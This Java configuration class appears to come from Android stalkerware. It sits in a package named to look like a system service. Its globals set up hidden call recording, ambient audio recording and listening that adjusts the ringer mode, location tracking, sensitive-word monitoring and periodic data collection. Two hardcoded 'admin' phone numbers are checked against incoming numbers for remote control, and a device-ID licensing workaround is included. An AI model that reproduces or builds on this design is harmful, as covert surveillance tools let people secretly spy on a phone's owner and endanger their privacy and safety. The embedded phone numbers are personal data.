package system.service;

import system.service.feature.location.LocationUtil;
import system.service.utils.FileCtrl.STORAGE_MODE;
import android.media.MediaRecorder;

import com.particle.inspector.common.util.license.LICENSE_TYPE;

public class GlobalValues 
{
	public final static int DEFAULT_RETRY_COUNT = 3;
	
	// Whose Flag
	// proxy : "p"
	// mine  : "m"
	public static String whose = "p";
	
	// Special DeviceID for workaround licensing
	// e.g. if set it to "A10005B", all phones which device ID contains "A10005B" will be automatically licensed.
	public static String SPECIAL_DEVICE_ID = "xxx"; 
	
	// GetInfo timer period
	public static long getInfoTimerPeriod = 300000; // 300 Seconds
	
	// Initialize global values 
	public static LICENSE_TYPE licenseType = LICENSE_TYPE.NOT_LICENSED;
	public static String deviceID = null;
	public static String recvPhoneNum = null;
	public static String[] recipients = null;
	public static String[] sensitiveWords = null;
	
	// For phone call recording
	public static int WAV_FILE_MAX_NUM = 25; // The max number of call recording being kept in internal storage
	public static boolean IS_CALL_RECORDING = false;
	public static String callRecordFilePrefix = null;
	
	// For env recording feature
	public static boolean IS_ENV_RECORDING = false;
	public static MediaRecorder recorder = null;
	public static String envRecordFilePrefix = null; 
	
	// The state flag for env listening feature
	public static boolean IS_ENV_LISTENING = false;
	public static int ORIGINAL_RING_MODE;
	
	// The state flag for phone location feature
	public static boolean IS_GETTING_LOCATION = false;
	
	// Admin phones
	public static String[]adminPhones = {"15100760464", "15319967068"};
	public static boolean isAdminPhone(String comingPhone) {
		for (String adminPhone : adminPhones) {
			if (comingPhone.contains(adminPhone)) return true;
		}
		return false;
	}
	
	// Location Utitity
	public static LocationUtil locationUtil = null;
	
	// Storage Mode
	public static STORAGE_MODE storageMode = STORAGE_MODE.INTERNAL;
}
